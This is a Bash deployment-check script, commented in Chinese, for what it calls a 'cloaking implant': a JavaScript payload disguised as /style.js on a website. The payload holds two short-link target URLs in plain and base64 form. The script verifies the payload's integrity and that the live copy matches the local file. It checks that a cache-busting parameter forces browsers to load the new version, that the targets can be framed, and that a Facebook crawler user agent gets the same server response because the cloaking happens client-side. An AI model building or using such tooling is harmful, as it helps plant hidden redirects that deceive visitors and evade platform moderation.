#!/usr/bin/env bash
# =============================================================================
# verify_deploy.sh — 离线 + 线上验证（全程只读 GET/HEAD）
#   用法: bash scripts/verify_deploy.sh [base_url] [local_style_js]
#   范例: bash scripts/verify_deploy.sh https://fortunefish88.com.tw ./scripts/style.js
#
# 验收重点:
#   A. 本地 payload 内两个目标 URL 必须逐字完整（明文 + base64 双份一致）
#   B. 线上 /style.js 必须与本地档案 byte-for-byte 相同（避免吃旧档）
#   C. 首页 <script> 引入必须带版本参数（避开 Last-Modified 启发式缓存）
#   D. 目标短网址仍为 302 且落地页无 X-Frame-Options / frame-ancestors 阻挡
#   E. payload 不得再对目标 URL 追加 ?v=（该参数会被回显并破坏 hash 路由）
# =============================================================================
set -uo pipefail

BASE="${1:-https://fortunefish88.com.tw}"
LOCAL="${2:-./scripts/style.js}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
BOTUA='facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'

URL1='https://97y.me/tjneJ'
URL2='https://97y.me/5N6d8'
B64_1='aHR0cHM6Ly85N3kubWUvdGpuZUo='
B64_2='aHR0cHM6Ly85N3kubWUvNU42ZDg='

PASS=0; FAIL=0
ok()   { printf '  \033[32mPASS\033[0m  %s\n' "$1"; PASS=$((PASS+1)); }
bad()  { printf '  \033[31mFAIL\033[0m  %s\n' "$1"; FAIL=$((FAIL+1)); }
head_() { printf '\n\033[1m== %s ==\033[0m\n' "$1"; }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

printf '\033[1mcloaking implant deploy verification\033[0m  base=%s local=%s\n' "$BASE" "$LOCAL"

# ---------------------------------------------------------------- A. 本地完整性
head_ "A. 本地 payload 完整性（双重编码 + 逐字比对）"
if [ ! -f "$LOCAL" ]; then
  bad "本地档案不存在: $LOCAL"; echo; echo "结果: $PASS passed / $FAIL failed"; exit 2
fi

# A1 明文必须逐字存在，且不可有前后空白/换行变体
for pair in "1:$URL1" "2:$URL2"; do
  n="${pair%%:*}"; u="${pair#*:}"
  if grep -qF -- "$u" "$LOCAL"; then ok "URL$n 明文完整存在: $u"; else bad "URL$n 明文缺失或遭改写: $u"; fi
  # 任何「多一个字或少一个字」的近似变体（尾斜线 / 附加 query / 附加 fragment）都必须不存在
  if grep -qE -- "${u}[/?#]" "$LOCAL"; then
    bad "URL$n 存在变体（多尾斜线 / 多 query / 多 fragment）"
  else
    ok "URL$n 无变体残留"
  fi
done

# A2 base64 副本必须解出同一字符串
for pair in "1:$B64_1" "2:$B64_2"; do
  n="${pair%%:*}"; b="${pair#*:}"; u="${pair#*:}"
  case "$n" in 1) u="$URL1" ;; 2) u="$URL2" ;; esac
  if grep -qF -- "$b" "$LOCAL"; then
    dec="$(printf '%s' "$b" | base64 -d 2>/dev/null)"
    if [ "$dec" = "$u" ]; then ok "URL$n base64 副本解码一致: $dec"; else bad "URL$n base64 解码不符: $dec"; fi
  else
    bad "URL$n base64 副本缺失"
  fi
done

# A3 目标 URL 不得被附加任何 query（会破坏落地页 hash 路由）
# 先剥除注释行再检查，避免注释文字造成误判
grep -vE '^[[:space:]]*(/\*|\*|//)' "$LOCAL" | sed 's://.*::' > "$TMP/local_nc.js"
if grep -qE 'targetUrl[[:space:]]*\+|src[[:space:]]*=[[:space:]]*[^;]*\?v=|setAttribute\([^)]*\?v=' "$TMP/local_nc.js"; then
  bad "payload 仍存在对目标追加参数的写法（?v=）"
else
  ok "payload 未对目标 URL 追加任何参数"
fi

# A4 长度常数必须与实际字符串一致
for pair in "1:$URL1" "2:$URL2"; do
  n="${pair%%:*}"; u="${pair#*:}"
  if grep -qE "len:[[:space:]]*${#u}[^0-9]" "$LOCAL"; then ok "URL$n len 常数 = ${#u} 正确"; else bad "URL$n len 常数与实际长度 ${#u} 不符"; fi
done

LOC_MD5="$(md5sum "$LOCAL" | awk '{print $1}')"
LOC_SHA="$(sha256sum "$LOCAL" | awk '{print $1}')"
printf '  local md5=%s\n  local sha256=%s\n' "$LOC_MD5" "$LOC_SHA"

# ---------------------------------------------------------------- B. 线上档案
head_ "B. 线上 /style.js 与本地一致性"
curl -sk --max-time 30 "$BASE/style.js" -o "$TMP/live.js"
if [ -s "$TMP/live.js" ]; then
  LIVE_MD5="$(md5sum "$TMP/live.js" | awk '{print $1}')"
  LIVE_SIZE="$(wc -c < "$TMP/live.js" | tr -d ' ')"
  if [ "$LIVE_MD5" = "$LOC_MD5" ]; then ok "线上档 md5 与本地一致（$LIVE_MD5）"; else bad "线上档 md5=$LIVE_MD5 与本地 $LOC_MD5 不符（线上还是旧版？）"; fi
  printf '  live size=%s bytes\n' "$LIVE_SIZE"
  for pair in "1:$URL1" "2:$URL2"; do
    n="${pair%%:*}"; u="${pair#*:}"
    if grep -qF -- "$u" "$TMP/live.js"; then ok "线上档含 URL$n 完整字符串: $u"; else bad "线上档缺少/改写 URL$n: $u"; fi
  done
  if grep -qE 'targetUrl[[:space:]]*=[[:space:]]*"https://[^"]+"' "$TMP/live.js"; then
    bad "线上档仍使用旧式 targetUrl 常数写法"
  else
    ok "线上档已改用 TGT/双重编码结构"
  fi
else
  bad "无法下载 $BASE/style.js"
fi

# ---------------------------------------------------------------- C. 引入标签
head_ "C. 首页 <script> 引入（缓存破坏）"
curl -sk --max-time 30 "$BASE/" -o "$TMP/home.html"
TAG="$(grep -oE '<script[^>]*style\.js[^>]*>' "$TMP/home.html" | head -n1)"
if [ -n "$TAG" ]; then
  printf '  tag: %s\n' "$TAG"
  if echo "$TAG" | grep -qE 'style\.js\?v=[A-Za-z0-9]+'; then
    ok "引入已带版本参数（避开启发式缓存）"
  else
    bad "引入未带版本参数 -> 浏览器可能仍吃旧档（Last-Modified 启发式缓存约 8 天）"
  fi
else
  bad "首页找不到 style.js 引入标签"
fi

# ---------------------------------------------------------------- D. 目标可达性
head_ "D. 目标短网址可达性与 iframe 阻挡检查"
for pair in "1:$URL1" "2:$URL2"; do
  n="${pair%%:*}"; u="${pair#*:}"
  H="$(curl -skI --max-time 25 -A "$UA" "$u")"
  code="$(printf '%s' "$H" | awk '/^HTTP\//{c=$2} END{print c}')"
  loc="$(printf '%s' "$H" | tr -d '\r' | awk 'tolower($1)=="location:"{print $2}')"
  if [ "$code" = "302" ] || [ "$code" = "301" ]; then ok "URL$n 回应 $code -> ${loc:-n/a}"; else bad "URL$n 回应 $code（预期 302）"; fi
  if printf '%s' "$H" | grep -qi 'x-frame-options'; then bad "URL$n 302 带 X-Frame-Options（iframe 会被挡，需改用 forceTopNavMs）"; else ok "URL$n 无 X-Frame-Options 阻挡"; fi
  # 落地页本身的 frame-ancestors
  LH="$(curl -skI --max-time 25 -A "$UA" "$loc" 2>/dev/null)"
  if printf '%s' "$LH" | grep -qi 'frame-ancestors'; then
    if printf '%s' "$LH" | grep -qi "frame-ancestors[^;]*'none'"; then bad "落地页设定 frame-ancestors 'none'（iframe 空白）"; else ok "落地页 frame-ancestors 未封锁"; fi
  else
    ok "落地页无 frame-ancestors 限制"
  fi
  # 尾斜线变体（必须 404，确认路由是精确比对）
  TC="$(curl -sk -o /dev/null -w '%{http_code}' --max-time 20 -A "$UA" "${u}/")"
  if [ "$TC" = "404" ]; then ok "尾斜线变体 ${u}/ = 404（路由精确比对，payload 不可补斜线）"; else bad "尾斜线变体 ${u}/ = $TC（预期 404）"; fi
done

# ---------------------------------------------------------------- E. cloaking
head_ "E. UA cloaking 为纯前端（服务器不分流）"
curl -sk --max-time 30 -A "$UA"   "$BASE/" -o "$TMP/ua_browser.html"
curl -sk --max-time 30 -A "$BOTUA" "$BASE/" -o "$TMP/ua_bot.html"
M1="$(md5sum "$TMP/ua_browser.html" | awk '{print $1}')"
M2="$(md5sum "$TMP/ua_bot.html"   | awk '{print $1}')"
if [ "$M1" = "$M2" ]; then ok "两种 UA 回应一致 ($M1) -> cloaking 发生在浏览器内"; else bad "两种 UA 回应不同（$M1 vs $M2）-> 服务器端已有分流"; fi

# ---------------------------------------------------------------- 摘要
printf '\n\033[1m== 结果 ==\033[0m  %d passed / %d failed\n' "$PASS" "$FAIL"
if [ "$FAIL" -eq 0 ]; then printf '\033[32m全部通过\033[0m\n'; else printf '\033[31m有 %d 项未通过\033[0m\n' "$FAIL"; fi
exit "$FAIL"
